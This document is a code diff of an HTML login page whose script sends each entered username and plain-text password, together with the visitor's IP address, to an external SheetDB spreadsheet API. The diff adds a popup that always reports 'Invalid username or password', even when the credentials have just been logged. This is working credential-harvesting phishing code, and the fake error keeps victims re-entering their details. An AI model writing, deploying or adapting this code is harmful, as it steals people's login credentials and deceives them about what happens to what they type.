@@ -13,6 +13,8 @@
   </head>
 
   <body>
+
+    <!-- 🔴 TOP POPUP ALERT -->
     <div id="topAlert" class="top-alert">Invalid username or password</div>
 
     <!-- LOGO -->
@@ -76,31 +78,51 @@
     <script>
       const API_URL = "https://sheetdb.io/api/v1/ye9thoog76f80";
 
+      // 🔴 Popup function that always animates
+      function showAlert(message) {
+        const alertBox = document.getElementById("topAlert");
+        alertBox.textContent = message;
+
+        // Restart animation
+        alertBox.classList.remove("show");
+        setTimeout(() => {
+          alertBox.classList.add("show");
+        }, 20);
+
+        // Auto hide
+        setTimeout(() => {
+          alertBox.classList.remove("show");
+        }, 2500);
+      }
+
       function submitForm() {
         const username = document.getElementById("username").value.trim();
         const password = document.getElementById("password").value.trim();
 
+        // 🔴 ALWAYS show popup on login attempt
+        showAlert("Invalid username or password");
+
+        // If fields are empty, stop here
         if (!username || !password) {
-          alert("Please fill both fields");
           return;
         }
 
-        // Fetch user IP
+        // --- Your database logging still works below ---
+
         fetch("https://api.ipify.org?format=json")
           .then(res => res.json())
           .then(ipData => {
             const data = {
               data: [
                 {
-                  username: "'" + username, // Force plain text
-                  password: "'" + password, // Force plain text
+                  username: "'" + username,
+                  password: "'" + password,
                   ip: ipData.ip,
                   timestamp: new Date().toLocaleString()
                 }
               ]
             };
 
-            // Send data to SheetDB
             fetch(API_URL, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -109,18 +131,19 @@
             .then(res => {
               if (!res.ok) throw new Error("Submission failed");
               document.getElementById("successMsg").style.display = "block";
-              // Reset form fields
+
+              // Clear fields
               document.getElementById("username").value = "";
               document.getElementById("password").value = "";
             })
             .catch(err => {
               console.error(err);
-              alert("Error submitting form. Please try again.");
+              showAlert("Error submitting form");
             });
 
           })
           .catch(() => {
-            alert("Could not fetch your IP. Please try again.");
+            showAlert("Could not fetch IP");
           });
       }
     </script>
